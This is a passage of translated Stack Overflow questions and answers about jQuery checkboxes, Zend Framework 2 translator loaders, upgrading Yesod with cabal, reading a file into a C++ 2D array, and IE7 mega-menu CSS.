> 时间：2012-10-25T19:49:00.240
> 
> 标签：javascript, jquery, html

我的 html 页面中有许多`CheckBox`元素。我想要的是每当检查其中任何一个时，动态地将一个添加`input type='checkbox'`到 html 页面。如果未选中，则删除添加的元素。不应重复任何元素。

```
<html><head>
            <title>Welcome ! eDetailing :: Admin</title>
           </head>
        <body id="bdload">

    <form name="frm" method="post">
    <input type="hidden" name="deleteId" id="deleteId" value="3">
    <input type="hidden" name="nextId" id="nextId" value="1-0">
    <input type="hidden" name="prvId" id="prvId" value="4-0">

    <!----------------------------------------------media Information ------------------------------------------------------>
        <div id="faqtable1" class="icongroup2">
            <div class="clBlock">
    <!--*****************************************************************************-->
                <div class="clRow">
                    <div class="clLeft">
                        <span id="docFname" class="col1">
                           <label class="clsvlabel" for="selMediaTitle">Media Title : </label>
                        </span>
                        <span class="col2 clWrite">
                            <label class="labelshow" style="display: none; ">media 2</label>
                             <select name="selMediaTitlen" class="clsvtext clvselectempty" id="selMediaTitle" style="display: inline-block; "> 
                                <option value="">Media Title</option>
                                <option value="42">Energy</option> 
                                  <option value="43" selected="selected">media 2</option> 
                                  <option value="44">media 3</option> 
                                  <option value="45">media 4</option> 
                                  <option value="46">mediapicture</option> 
                                  <option value="47">mediavid</option> 
                                  <option value="48">mediapdf</option> 
                                                          </select>
                        </span>
                    </div>
                </div>

            <div class="clRow">
                       <div class="clRight1">
                            <span id="docLname" class="col1">
                                <label class="clsvlabel" for="txtmrname"></label>
                            </span>
                            <span class="col2 clWrite2">
                                <div class="clcheckboxlist1">
                                   <div class="clckbxheader">
                                       <input type="checkbox" class="clckbxheadlist1 clsvtextempty" id="ckidh1" style="">
                                       <label for="ckidh1" id="chk1">Check All Doctor</label>
                                       <label for="ckidh1" id="unchk1" style="display:none;">UnCheck All Doctors</label>
                                   </div>
                                   sdsd
                                   <div class="clckbxbody1" id="cklist1">
                                    <span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" checked="checked" id="28" name="checkMr[]" value="28" style=""><label for="ckid1"><em style="background-color:#00FF7F;" class="emdoclist">Core Ai</em>Zaheerdfsfghg  Sdf</label>
                                                               </span><div name="mydiv&gt;&lt;input type=" checkbox'class="txtshow clsvtextempty" id="28" value="28" class="checkmrdone"></div><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="6" name="checkMr[]" value="6" style=""><label for="ckid1"><em style="background-color:#00FF7F;" class="emdoclist">Core Ai</em>Prizall Anuj Bagrecha</label>
                                                               </span><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="7" name="checkMr[]" value="7" style=""><label for="ckid1"><em style="background-color:#00FF7F;" class="emdoclist">Core Ai</em>Javedq Rashid Ansari</label>
                                                               </span><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="2" name="checkMr[]" value="2" style=""><label for="ckid1"><em style="background-color:#00FF7F;" class="emdoclist">Core Ai</em>Vijay Kumar Asthana</label>
                                                               </span><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="34" name="checkMr[]" value="34" style=""><label for="ckid1"><em style="background-color:#00FF7F;" class="emdoclist">Core Ai</em>Manish  Malviya</label>
                                                               </span><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="1" name="checkMr[]" value="1" style=""><label for="ckid1"><em style="background-color:#9ACD32;" class="emdoclist">Core Bi</em>Sujoy Kumar Kale</label>
                                                               </span><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="4" name="checkMr[]" value="4" style=""><label for="ckid1"><em style="background-color:#9ACD32;" class="emdoclist">Core Bi</em>Avkaash K Tare</label>
                                                               </span><span class="clckbxrow"> <input type="checkbox" class="txtshow clsvtextempty" id="5" name="checkMr[]" value="5" style=""><label for="ckid1"><em style="background-color:#800000;" class="emdoclist">Core Ci</em>Viabhav Shishir Parkhe</label>
                                                               </span>                               </div>

                                   </div>
                            </span>            
                        </div>
                    </div>
    <!--*****************************************************************************-->
                    <div class="clRow">
                        <div class="clLeft">
                            <span id="docFname" class="col1">
                               <label class="clsvlabel" for="chk_active">Active :</label>
                            </span>
                            <span class="col2 clWrite">
                            <label class="labelshow" style="display: none; ">
                                YES 
                            </label>
                            <input type="checkbox" name="chk_active" id="chk_active" value="0" style="width: auto; display: inline-block; " class="clsvtext clvselectempty clsvtextempty" checked="checked">
                            </span>
                        </div>
                    </div>
           </div>
      </div>

    </form>
    </div>
                                </div>
                            </div>
                        </span>
                    </div>
                </div>
            </div>

        <script type="text/javascript">
        $j("#btnadvsearch").bind("click", function() {
                    $j.ajax({ 
                    type:"POST",
                    url:"advanceSearch.php",
                    data: { name : $j("#advMedia").val(),type : $j("#advType").val(),activ : $j("#selActive").val(),},
                    success:function(response){ 
                    $j("#showResult").html(response);
                    }
                }); 
        });

        </script>

    <div class="Zebra_DatePicker"><table class="dp_header"><tbody><tr><td class="dp_previous">«</td><td class="dp_caption">&nbsp;</td><td class="dp_next">»</td></tr></tbody></table><table class="dp_daypicker"></table><table class="dp_monthpicker"></table><table class="dp_yearpicker"></table></div><div class="Zebra_DatePicker"><table class="dp_header"><tbody><tr><td class="dp_previous">«</td><td class="dp_caption">&nbsp;</td><td class="dp_next">»</td></tr></tbody></table><table class="dp_daypicker"></table><table class="dp_monthpicker"></table><table class="dp_yearpicker"></table></div></body><span id="skype_highlighting_settings" display="none" autoextractnumbers="1"></span><object id="skype_plugin_object" location.href="http://localhost/konnect/mediaAssgin/" location.hostname="localhost" style="position: absolute; visibility: hidden; left: -100px; top: -100px; " width="0" height="0" type="application/x-vnd.skype.click2call.chrome.5.7.0"></object></html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T19:52:45.597

使用 jQuery 的[`.change()`](http://api.jquery.com/change/)函数来确定复选框何时更改。然后，使用[`.remove()`](http://api.jquery.com/remove/)和[`.append()`](http://api.jquery.com/append/)函数分别删除或添加元素。

如果您只想*隐藏*一个元素（而不是真正从 DOM 中删除它），请使用[`.hide()`](http://api.jquery.com/hide/). [`.attr()`](http://api.jquery.com/attr/)如果您更愿意使用自己的自定义类来隐藏元素，也可以设置元素的类。

不要期望人们只是为您编写代码。jQuery 的文档非常好，应该足以帮助您入门。

# zend-framework2 - 在 Zend Framework 2 中注册自定义 Translator Loader

> ID：13076103
> 
> 赞同：5
> 
> 时间：2012-10-25T19:49:04.883
> 
> 标签：zend-framework2, zend-translate

我正在尝试注册一个自定义数据库翻译加载器。

为此，我受到了启发： [Feeding Zend Translator](http://www.dasprids.de/blog/2012/08/23/feeding-zend-i18n-translator-from-a-database)

我在（module.config.php）中有以下工厂代码：

```
'service_manager' => array(
    'factories' => array(
        'translator' => function($sm){
            $translator = new \V1\Service\DatabaseTranslationService();
            return $translator->createService($sm);
        },
    ),
), 
```

DatabaseTranslationService 看起来像这样：

```
$config = $serviceLocator->get('Config');
    $trConfig = isset($config['translator']) ? $config['translator'] : array();
    $translator = new \Zend\I18n\Translator\Translator();
    $translator->getPluginManager()->setInvokableClass('database', '\Foo\I18n\Translator\Loader\DatabaseTranslator', true);
    $translator->addTranslationFile('database', 'en_EN');

    return $translator; 
```

但似乎没有使用“setInvokableClass”：我收到此错误：

```
Zend\ServiceManager\ServiceManager::get was unable to fetch or create an instance for database 
```

有人知道如何正确注册翻译吗

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T20:47:51.587

经过两天的搜索，我找到了解决方案。

我不知道这是否是一个好的解决方案，但它对我有用。

换行：

```
$translator->getPluginManager()->setInvokableClass('database', '\Foo\I18n\Translator\Loader\DatabaseTranslator', true); 
```

和

```
$viewHelper = $serviceLocator->get('viewHelperManager');
$viewHelper->setInvokableClass('database', '\Foo\I18n\Translator\Loader\DatabaseTranslator', true); 
```

我希望这个解决方案可以帮助你。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-09-20T22:23:06.097

在当前版本（zf2 2.2.4）中，您只需要更改`type`-config 条目：

```
'translator' => array(
    'locale' => 'de_DE',
    'translation_file_patterns' => array(
        array(
            'type' => 'YourNamespace\I18n\Translator\Loader\YourCustomFormat',
            'base_dir' => __DIR__ . '/../language',
            'pattern'  => '%s.whatever',
        ),
    ),
) 
```

`YourNamespace\I18n\Translator\Loader\YourCustomFormat`必须实现`Zend\I18n\Translator\Loader\FileLoaderInterface`接口；该`load($locale, $filename)`方法必须返回一个`Zend\I18n\Translator\TextDomain`实例。

这对我有用。

（当然自动加载器必须找到类）

# haskell - 如何将Yesod升级到最新版本？

> ID：13076104
> 
> 赞同：2
> 
> 时间：2012-10-25T19:49:04.937
> 
> 标签：haskell, ubuntu, yesod

在我做了一个之后

```
cabal install yesod 
```

我做了一个

```
yesod version 
```

但它输出 0.10.2.1。我相信的最新版本是 1.3

如何升级到最新版本？我正在尝试在 Ubuntu 服务器上设置 yesod。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T11:03:06.713

处理已安装的软件包有 ghc-pkg，所以要删除 yesod

```
ghc-pkg unregister yesod 
```

这不会删除可执行文件，所以

```
rm ~/.cabal/bin/yesod 
```

然后更新包列表

```
cabal update 
```

然后 cabal install 将选择与您的 ghc 版本兼容的最新版本（基于“基础”包依赖项）（如果我没记错的话）

```
cabal install yesod 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-28T07:50:56.723

将 cabal 安装的包添加到你的路径：

```
export PATH="$HOME/.cabal/bin":$PATH 
```

*进入终端。*

这意味着您可以运行 yesod`yesod`而不是：

```
~/.cabal/bin/yesod 
```

# c++ - 从c ++中的文件加载到二维数组中

> ID：13076111
> 
> 赞同：1
> 
> 时间：2012-10-25T19:49:29.303
> 
> 标签：c++

我无法将文件中的数字读取到 C++ 中的二维数组中。它可以很好地读取第一行，但其余行填充为 0。我不知道我做错了什么。

```
#include <iostream>
#include <fstream>

using namespace std;

int main()
{
    int myarray[20][20];

    int totRow = 20, totCol = 20, number, product, topProduct = 0, row, col, count;
    char element[4];

    ifstream file;

    file.open( "c:\\2020.txt" );

    if( !file )
    {
        cout << "problem";
        cin.clear();
        cin.ignore(255, '\n');
        cin.get();

        return 0;
    }

    while( file.good())
    {
        for( row = 0; row < totRow; row++ )
        {
            for( col = 0; col < totCol; col++ )
            {
                file.get( element, 4 );
                number = atoi( element );
                myarray[row][col] = number;
                cout << myarray[row][col] << " ";
            }
            cout << endl;

        }
        file.close();
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T19:53:50.337

如果您的文件中只有数字，您可以使用`>>`操作员读取它们。将您的内部循环更改为：

```
for( col = 0; col < totCol; col++ )
{
    file >> myarray[row][col];
    cout << myarray[row][col] << " ";
} 
```

问题`file.get()`是，它不会超出 newline `\n`。见：[std::basic_istream::get](http://en.cppreference.com/w/cpp/io/basic_istream/get)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T19:55:17.310

您正在 while 循环内关闭文件：

```
while( file.good())
    {
        for( row = 0; row < totRow; row++ )
        {
            for( col = 0; col < totCol; col++ )
            {
                file.get( element, 4 );
                number = atoi( element );
                myarray[row][col] = number;
                cout << myarray[row][col] << " ";
            }
            cout << endl;

        }
        file.close();   // <------ HERE
    } // end of while loop is here 
```

您显然无法从封闭的流中读取。现在，因为您试图在`while`循环的第一次迭代中读取所有数据，所以这似乎不是您的直接问题。但是请注意，`good()`即使在您读取了所有有意义的数据之后（例如，如果有一个换行符），流仍然可以存在，在这种情况下，您将第二次进入循环。那是一个错误。

# javascript - Internet Explorer 7 CSS Mega 菜单定位

> ID：13076113
> 
> 赞同：1
> 
> 时间：2012-10-25T19:49:35.350
> 
> 标签：javascript, css, internet-explorer, internet-explorer-7, position

我用 HTML 和 CSS 创建了一个适用于所有主要浏览器（Chrome、Firefox、IE8+ 和 Safari）的菜单。你可以在这里找到它：http: [//www.calvaryccm.com/melbourne](http://www.calvaryccm.com/melbourne)

该问题仅出现在 IE 7 中。

我有一个使用一些 JS 来实现效果的悬停菜单。当我尝试在 IE7 中渲染它时，会发生以下情况：

![在此处输入图像描述](../Images/d3f848a59e7160db69f9dd77add62506.png)

这是应该发生的： ![在此处输入图像描述](../Images/afa8d32b42995809dabb148ca90eaaf2.png)

**HTML：**

```
<div id="menu-wrapper">
<ul class="megaCreator" id="menu"> <!-- About -->
    <li class="megaMenu-drop"> <a href="#">About</a>
    <div id="dropdown-wrapper" class="about"></div>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <h4>Melbourne Campus</h4>
    <ul>
        <li><a href="/melbourne">Campus Home</a></li>
        <li><a href="/melbourne/about">Campus History</a></li>
        <li><a href="/melbourne/meet-the-pastors">Meet The Pastors</a></li>
        <li><a href="https://maps.google.com/maps?q=2955+Minton+Road,+West+Melbourne,+FL&amp;hl=en&amp;oq=2955+minto&amp;t=h&amp;doflg=ptm&amp;hnear=2955+Minton+Rd,+West+Melbourne,+Brevard,+Florida+32904&amp;z=17&amp;iwloc=A">Directions</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>New To CCM</h4>
    <ul>
        <li><a href="/welcome-new/how-do-i-get-saved">How Do I Get Saved</a></li>
        <li><a href="/welcome-new/five-cs">Five C's</a></li>
        <li><a href="/welcome-new/statement-of-faith">Statement of Faith</a></li>
        <li><a href="/contact-us/service-times">Service Times</a></li>
        <li><a href="/contact-us">Contact Us</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>&nbsp;</h4>
    <ul>
        <li><a href="/contact-us/staff-contacts">Staff Contacts</a></li>
        <li><a href="/resources/baptism">Baptism</a></li>
    </ul>
    </div>
    <div class="three-col">
    <h4 style="margin-left: -1px;">What We Believe</h4>
    <p>Our core values here at Calvary Chapel Melbourne can be summed up with five C&rsquo;s. &nbsp;We <em>commit</em> our lives to Christ and <em>celebrate</em> the fulfilling lifestyle, <em>connecting</em> to others through personal relationships, <em>communicating</em> the Good News and <em>contributing</em> our time, passion, talents and possessions to the cause of Christ.</p>
    </div>
    </div>
    </li>
    <!-- End About --> <!-- What's New -->
    <li class="megaMenu-drop"> <a href="#">What's New</a>
    <div id="dropdown-wrapper" class="whatsNew"></div>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <h4>News</h4>
    <a href="/news"><img alt="News" src="/images/navigation/news.png" width="140" height="104" /></a> </div>
    <div class="one-col">
    <h4>Events</h4>
    <a href="/events"><img alt="Events" src="/images/navigation/event.png" width="140" height="104" /></a> </div>
    <div class="one-col">
    <h4>Calendar</h4>
    <a href="https://my.calvaryccm.com/portal/event_calendar.aspx?filter=campus:5"><img alt="Calendar" src="/images/navigation/calendar.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>Newsletter</h4>
    <a href="/subscribe"><img alt="Newsletter" src="/images/navigation/newsletter.png" width="140" height="104" /></a></div>
    <div class="two-col">
    <h4>Next Big Thing!</h4>
    <a href="/events/8067/fall-fest-2012-date-change"><img alt="Fall Fest" src="/images/navigation/nextbigthing.png" width="300" height="104" /></a></div>
    </div>
    </li>
    <!-- end What's New --> <!-- Ministries -->
    <li class="megaMenu-drop">
    <div id="dropdown-wrapper" class="ministries"></div>
    <a href="#">Ministries</a>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <h4>Students</h4>
    <ul class="megaMenu-links">
        <li><a href="/melbourne/ministries/244/childrens-ministry">Kids</a></li>
        <li><a href="/melbourne/ministries/415/412-jr-high">412 Jr. High</a></li>
        <li><a href="/melbourne/ministries/390/412-sr-high">412 Sr. High</a></li>
        <li><a href="/melbourne/ministries/61/fusion-melbourne">Young Adults</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>Men</h4>
    <ul class="megaMenu-links">
        <li><a href="/melbourne/ministries/360/mens-ministry">R.E.A.L. Men</a></li>
        <li><a href="/melbourne/ministries/520/gait-keepers-father-son-ministry">Gait Keepers</a></li>
        <li><a href="/melbourne/ministries/285/mens-sports">Sports</a></li>
        <li><a href="/melbourne/recovery">Recovery</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>Women</h4>
    <ul class="megaMenu-links">
        <li><a href="/melbourne/ministries/378/womens-ministries">Sisterhood</a></li>
        <li><a href="/melbourne/ministries/485/moms4moms">Moms4Moms</a></li>
        <li><a href="/melbourne/recovery">Recovery</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>Couples</h4>
    <ul class="megaMenu-links">
        <li><a href="/melbourne/ministries/465/couples-ministry">Couples</a></li>
        <li><a href="/melbourne/ministries/426/divorce-care">Divorce Care</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>Other</h4>
    <ul class="megaMenu-links">
        <li><a href="/resources/bible-college">Bible College</a></li>
        <li><a href="/the-chapel-store">Bookstore</a></li>
        <li><a href="/common-grounds-cafe">Cafe</a></li>
        <li><a href="http://www.ccamelb.com/home.aspx">CCA</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>All Ministries</h4>
    <a href="/melbourne/ministries"><img alt="All Ministries" src="/images/navigation/allministries.png" width="140" height="104" /></a></div>
    </div>
    </li>
    <!-- end Ministries --> <!-- Missions -->
    <li class="megaMenu-drop"> <a href="#">Missions</a>
    <div id="dropdown-wrapper" class="about"></div>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <h4>Missionaries</h4>
    <a href="/missions/missionaries"><img alt="Missionaries" src="/images/navigation/missionaries.png" width="140" height="104" /></a> </div>
    <div class="one-col">
    <h4>Mission Trips</h4>
    <a href="/missions/mission-trips"><img alt="Mission Trips" src="/images/navigation/missiontrips.png" width="140" height="104" /></a> </div>
    <div class="one-col">
    <h4>Local Outreach</h4>
    <a href="/missions/local-outreach"><img alt="Local Outreach" src="/images/navigation/localoutreach.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>Evangelism</h4>
    <a href="/missions/evangelism"><img alt="Evangelism" src="/images/navigation/Evangelism.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>GMO</h4>
    <a href="/missions/global-media-outreach"><img alt="Global Media Outreach (GMO)" src="/images/navigation/gmomissions.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4 style="margin-left: -1px;">What's Missions</h4>
    <p>Our strategy for missions is to build and support relationships that inspire change. We to this by serving our community and the world in love.</p>
    </div>
    </div>
    </li>
    <!--End Missions--> <!-- Teachings -->
    <li class="megaMenu-drop"> <a href="#">Teachings</a>
    <div id="dropdown-wrapper" class="teachings"></div>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <ul>
        <li><a href="/teachings">Teachings Home</a></li>
        <li><a href="/teachings/main">Main Archive</a></li>
        <li><a href="/teachings/viera">Viera Archive</a></li>
        <li><a href="/teachings/teachings-by-topic">Teachings by Topic</a></li>
        <li><a href="/resources/apps">Mobile Apps</a>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
    </ul>
    </div>
    <div class="one-col">
    <ul>
        <li><a href="/resources/roku">Roku</a>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
        <li><a href="/resources/resources/feeds-and-podcasts">Feeds and Podcasts</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>Current Series</h4>
    <a href="/teachings/main/series/74"><img alt="Current Weekend Series" src="/images/navigation/currentseries.png" /></a> </div>
    <div class="one-col">
    <h4>Last Praise Night</h4>
    <a href="/teachings/main/video/PN2012/speak-to-me-lord"><img alt="Latest Praise Night" src="/images/navigation/currentpraisenight.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>Devotions</h4>
    <a href="/daily-devotions"><img alt="Daily Devotionals" src="/images/navigation/devos.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>Live Streaming</h4>
    <a href="/teachings/live-streaming"><img alt="Live Streaming Church Service" src="/images/navigation/livestreaming1.png" width="140" height="104" /></a></div>
    </div>
    </li>
    <!-- end Teachings --> <!-- Connect -->
    <li class="megaMenu-drop"> <a href="#">Connect</a>
    <div id="dropdown-wrapper" class="getInvolved"></div>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <ul>
        <li><a href="/melbourne/small-groups">Bible Studies</a></li>
        <li><a href="/melbourne/small-groups">Homegroups</a></li>
        <li><a href="http://www.facebook.com/CalvaryCCM">Facebook</a>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
        <li><a href="http://twitter.com/CalvaryCCM">Twitter</a>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
        <li><a href="/contact-us">Contact Us</a></li>
    </ul>
    </div>
    <div class="one-col">
    <h4>iPray</h4>
    <a href="/ipray"><img alt="iPray" src="/images/navigation/ipray.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>Small Groups</h4>
    <a href="/melbourne/small-groups"><img alt="Small Groups" src="/images/navigation/smallgroups.png" width="140" height="104" /></a></div>
    <div class="one-col">
    <h4>GMO</h4>
    <a href="/missions/global-media-outreach"><img alt="Clobal Media Outreach (GMO)" src="/images/navigation/gmo1.png" width="140" height="104" /></a></div>
    <div class="two-col">
    <h4>Volunteer Application</h4>
    <a href="/volunteer-application"><img alt="Volunteer Application" src="/images/navigation/volunteerapp.png" width="240" height="104" /></a></div>
    </div>
    </li>
    <!-- end Connect --> <!-- How Can I Help -->
    <li class="megaMenu-drop"> <a href="#">Giving</a>
    <div id="dropdown-wrapper" class="getInvolved"></div>
    <div class="megaMenu-content drop-six-columns">
    <div class="one-col">
    <ul>
        <li><a href="https://my.calvaryccm.com/portal/online_giving.aspx?filter=campus:5&amp;template=melbourne&amp;remembertemplate=true">Online Giving</a></li>
        <li><a href="/resources/volunteer">Volunteer</a></li>
        <li><a href="/resources/employment-opportunities">Employment</a></li>
        <li><a href="/contact-us">Contact Us</a></li>
    </ul>
    </div>
    <div class="two-col">
    <h4>Where Can I Serve?</h4>
    <a href="https://my.calvaryccm.com/portal/opportunity_finder.aspx?template=melbourne&amp;remembertemplate=true"><img alt="Opportunity Finder" src="/images/navigation/opportunities.png" width="300" height="104" /></a></div>
    <div class="one-col">
    <h4>Volunteer</h4>
    <a href="/resources/volunteer"><img alt="Volunteer With Us" src="/images/navigation/volunteer.png" width="140" height="104" /></a></div>
    <div class="two-col">
    <h4 style="margin-left: -1px;">Why We Need Volunteers</h4>
    <p>You might be asking, &ldquo;Why volunteer?&rdquo;&nbsp; As so many Christians have discovered, serving is what life is all about.&nbsp; Serving is how God transforms everything &ndash; our marriages, our families, our relationships, our community, and the world!</p>
    </div>
    </div>
    </li>
    <!-- end How Can I Help? --> </ul>
    </div> 
```

**CSS**：

```
.megaCreator, .megaCreator ul, .megaCreator li, .megaCreator a, .megaCreator img, .megaCreator div, .megaCreator p, .megaCreator form, .megaCreator input, .megaCreator textarea, .megaCreator h3, .megaCreator h4, .megaCreator h5 { margin: 0; padding: 0; font-size: 12px; font-family: sans-serif; }
.megaCreator a { text-decoration: none; }
.megaCreator li { list-style: none; }
.megaCreator input, .megaCreator textarea, .megaCreator img { outline: none; border: none; background: none; }

/* NAVIGATION BAR STYLES */
.megaCreator {
    position: relative;
    z-index: 500;
    clear: both;
    width: 100%;
    height: 37px;

    background: #FFFFFF;
}

.megaCreator:before,
.megaCreator:after {
    content: '';
    clear: both;
}

/* Nav List */
.megaCreator > li {
    height: 37px;
}

.megaCreator > li.megaMenu-align-right {
    float: right;
    border-right: none;
    border-left: 1px dotted #ccc;
}

/* Nav Links */
.megaCreator > li > a {
    position: relative;
    z-index: 550;
    display: block;
    padding: 3px 25px 10px 25px;
    line-height: 34px;
    font-size: 14px;
    color: #525252;

    -webkit-transition: color .15s ease-in, background-image .2s linear .15s;
    -moz-transition: color .15s ease-in, background-image .2s linear .15s;
    -o-transition: color .15s ease-in, background-image .2s linear .15s;
    -ms-transition: color .15s ease-in, background-image .2s linear .15s;
    transition: color .15s ease-in, background-image .2s linear .15s;
}

.megaCreator > li > a:hover { color: #000000; }

.megaCreator > li > a:active {
    color: #525252;

    -webkit-transition: color 1ms;
    -moz-transition: color 1ms;
    -o-transition: color 1s;
    -ms-transition: color 1s;
    transition: color 1s;
}

.megaCreator > li.megaMenu-drop:hover > a:after,
.megaCreator > li.megaMenu-drop > a.megaMenu-click:after {
    position: absolute;
    content: '';
    top: 0;
    left: 0;
    width: 100%;
    height: 38px;
}

.megaCreator > li.megaMenu-drop:hover > a,
.megaCreator > li.megaMenu-drop > a.megaMenu-click { z-index: 650; }

/*  DROPDOWN */

.megaCreator > li > div,
.megaCreator > li > ul,
.megaCreator > li > ul li > ul {
    position: absolute;
    z-index: 600;
    padding: 10px 0;
    top: 35px;
    left: 0px;
    overflow: hidden;
    visibility: hidden;
    border:none;
}

.megaCreator > li.megaMenu-align-right > div {
    left: auto;
    right: -1px;
}

/* Transitions */
.megaMenu-slide > li > div,
.megaMenu-slide > li > ul,
.megaMenu-slide > li > ul li > ul,
.megaMenu-fade > li > div,
.megaMenu-fade > li > ul,
.megaMenu-fade > li > ul li > ul {
    -webkit-transition: all .10s linear .15s;
    -moz-transition: all .10s linear .15s;
    -o-transition: all .10s linear .15s;
    -ms-transition: all .10s linear .15s;
    transition: all .10s linear .15s;
}

.megaMenu-slide > li > div,
.megaMenu-slide > li > ul,
.megaMenu-slide > li > ul li > ul { top: 100px; }

.megaMenu-slide > li.megaMenu-drop:hover > div,
.megaMenu-slide > li.megaMenu-drop:hover > ul,
.megaMenu-slide > li > ul li.megaMenu-drop:hover > ul {
    top: 40px;
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
    filter: alpha(opacity=100);
    opacity: 1;
    overflow: visible;
    visibility: visible;
}

.megaMenu-fade > li.megaMenu-drop:hover > div,
.megaMenu-fade > li.megaMenu-drop:hover > ul,
.megaMenu-fade > li > ul li.megaMenu-drop:hover > ul,
.megaCreator > li.megaMenu-drop:hover > div,
.megaCreator > li.megaMenu-drop:hover > ul,
.megaCreator > li > ul li.megaMenu-drop:hover > ul {
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
    filter: alpha(opacity=100);
    opacity: 1;
    overflow: visible;
    visibility: visible;
}

/* Dropdown Columns */

.megaCreator .drop-two-columns { width: 320px; }
.megaCreator .drop-three-columns { width: 480px; }
.megaCreator .drop-four-columns { width: 640px; }
.megaCreator .drop-five-columns { width: 800px; }
.megaCreator .drop-six-columns { width: 950px;
    background-color:#E7E7E7;
    height:202px;}

/* Content Columns */
.megaCreator .one-col { width: 140px; }
.megaCreator .two-col { width: 300px; }
.megaCreator .three-col { width: 460px; }
.megaCreator .four-col { width: 620px; }
.megaCreator .five-col { width: 780px; }
.megaCreator .six-col { width: 950px; }

.megaCreator .one-col, .megaCreator .two-col, .megaCreator .three-col, .megaCreator .four-col, .megaCreator .five-col, .megaCreator .six-col {
    float: left;
    margin: 8px;
}

/* Dropdown Levels */

.megaCreator > li > ul,
.megaCreator > li > ul li > ul {
    width: 160px;
    padding: 10px;
}

.megaCreator > li > ul li.megaMenu-drop:hover > ul,
.megaCreator.megaMenu-fade > li > ul li.megaMenu-drop > ul { top: -11px; }

.megaCreator > li > ul li { position: relative; }

.megaCreator > li > ul li > ul {
    position: absolute;
    left: 100%;
}

.megaCreator > li.megaMenu-align-right > ul {
    left: auto;
    right: 0;
}

.megaCreator > li > ul li.megaMenu-align-left > ul {
    position: absolute;
    left: auto;
    right: 105%;
}

.megaCreator > li > ul a {
    display: block;

    font-size: 14px;
    color: #5e5e5e;
    text-shadow: 0px 1px 1px white;

    -webkit-transition: color .15s ease-in;
    -moz-transition: color .15s ease-in;
    -o-transition: color .15s ease-in;
    -ms-transition: color .15s ease-in;
    transition: color .15s ease-in;
}

.megaCreator > li > ul li:last-child a { border: none; }

.megaCreator > li > ul a:hover { color: #888; }

/* CONTENT STYLES */

/* Text */
.megaMenu-content h2, .megaMenu-content h3, .megaMenu-content h4 {
    color: #555;
    margin: 10px 0;
    font-family:'TitilliumText22LBold', Arial, Helvetica, Verdana, sans-serif;
}

.megaMenu-content h2 { font-size: 20px; }
.megaMenu-content h3 { font-size: 18px; }
.megaMenu-content h4 { font-size: 18px; margin-left:4px; }

.megaMenu-content p {
    padding: 10px 0;
    line-height: 18px;
    color: #333;
}

/* Button */
.megaMenu-content .button {
float: left;
padding: 7px 33px 6px 10px;
border: 2px solid #2FB9CE;
background: #27B7D0 url(../images/bg-link.gif) no-repeat 100% 50%;
font: 15px/15px 'HelveticaNeueLTStd75Bold', Arial, Helvetica, Verdana, sans-serif;
color: white;
text-decoration: none;
margin: 0 6px 0 0;
text-shadow: 0 1px #158BA0;

}

/* Links */
.megaMenu-content a  {
    display: block;
    padding: 4px 4px 4px 4px;
    line-height: 20px;
    margin: 4px -7px -7px 0px;
}
.megaMenu-content a:hover { color: #02ABC8; background-image:url(../images/bg-decor-line01.png);}

.megaMenu-content .megaMenu-links a {
    display: block;
    padding: 4px 4px 4px 4px;
    line-height: 20px;
    margin: 4px 37px 3px 4px;
}

a.button:hover{
    color:#FFFFFF;
    background: #27B7D0 url(../images/bg-link.gif) no-repeat 100% 50%;
    text-decoration:underline;
}

.megaMenu-content .megaMenu-links li:last-child a { border: none; }

.megaMenu-links .block ul{
    padding: 0 0 0 18px;
    width:auto;
    overflow:hidden;
}

/* Cursor */
.megaMenu-content { cursor: default; }

/* Floats */
.megaMenu-content .fl { float: left; }
.megaMenu-content .fr { float: right; }
.megaMenu-content .cb { clear: both; }
.megaMenu-content .cl { clear: left; }
.megaMenu-content .cr { clear: right; }
.megaMenu-content .block { display: block; margin-top: 10px; width:auto;}

.block{
            padding: 0 0 20px;
        }

.about{
    height:196px;
}

.whatsNew{
    height:196px;
}
.ministries{
